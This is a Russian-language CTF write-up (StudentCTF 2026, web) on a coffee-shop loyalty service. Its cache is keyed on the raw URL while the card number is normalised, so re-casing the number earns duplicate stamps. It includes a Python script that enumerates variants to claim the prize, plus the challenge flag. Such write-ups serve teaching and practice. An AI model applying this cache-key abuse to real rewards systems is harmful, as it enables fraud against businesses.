## Кофейная карта

| Событие | Название | Категория |
| :------ | ---- | ---- |
| StudentCTF 2026 | Кофейная карта | web |

### Описание

> В Campus Brew за 16 визитов обещают особый приз. Моя карта почему-то перестала получать отметки. Получите приз.

### Решение

При первом открытии сайта получаем карту лояльности с номером вида:

```text
CAFE-7B2E-A5D3-ABCD
```

Поле с номером доступно для редактирования. Нажмём «Подтвердить визит» и
посмотрим запрос в DevTools. Отправляется `GET`:

```text
/api/visit?card=CAFE-7B2E-A5D3-ABCD
```

Первый запрос возвращает один штамп и технический заголовок:

```text
X-Cache: MISS
```

Повторяем тот же запрос. Количество штампов остаётся прежним, а заголовок
меняется на:

```text
X-Cache: HIT
```

Значит, повторный идентичный URL не доходит до логики начисления визита.
Изменим только регистр букв номера, например:

```text
/api/visit?card=cafe-7b2e-a5d3-abcd
```

Это снова `MISS`, прогресс увеличивается, а ответ возвращает прежний
канонический номер `CAFE-7B2E-A5D3-ABCD`. То же происходит, если убрать
дефисы. Таким образом, сервис по-разному обрабатывает две сущности:

1. для сохранённого ответа важна исходная строка URL;
2. для карты важен номер без дефисов и без учёта регистра.

Поэтому разные написания одного номера дают разные сохранённые ответы, но
увеличивают счётчик одной и той же карты. Нельзя добавлять произвольный
параметр вроде `&x=1`: сервер принимает ровно один параметр `card`, а
percent-encoding также отвергается. Используем только разные варианты регистра
и два разрешённых формата номера.

В номере гарантированно достаточно букв, поэтому вариантов более чем хватает.
Например, следующий скрипт получает карту, перебирает варианты и забирает приз:

```python
from itertools import product
import requests

base = 'http://<host>'
session = requests.Session()
session.get(base + '/')
code = session.get(base + '/api/card').json()['displayCode'].replace('-', '')

letters = [index for index, char in enumerate(code) if char.isalpha()]
seen = set()

for bits in product((False, True), repeat=len(letters)):
    chars = list(code)
    for index, lower in zip(letters, bits):
        chars[index] = chars[index].lower() if lower else chars[index].upper()
    plain = ''.join(chars)

    for variant in (plain, '-'.join((plain[:4], plain[4:8], plain[8:12], plain[12:]))):
        if variant in seen:
            continue
        seen.add(variant)
        response = session.get(base + '/api/visit?card=' + variant)
        assert response.status_code == 200
        assert response.headers['X-Cache'] == 'MISS'
        if response.json()['stamps'] == 16:
            break
    else:
        continue
    break

reward = session.post(base + '/api/reward/claim').json()
print(reward['code'])
```

После шестнадцатого уникального URL `POST /api/reward/claim` возвращает код
секретного напитка — флаг.

### Флаг

```
stctf{H1t_h1T_H1T_h1t_c4f3bR34k}
```

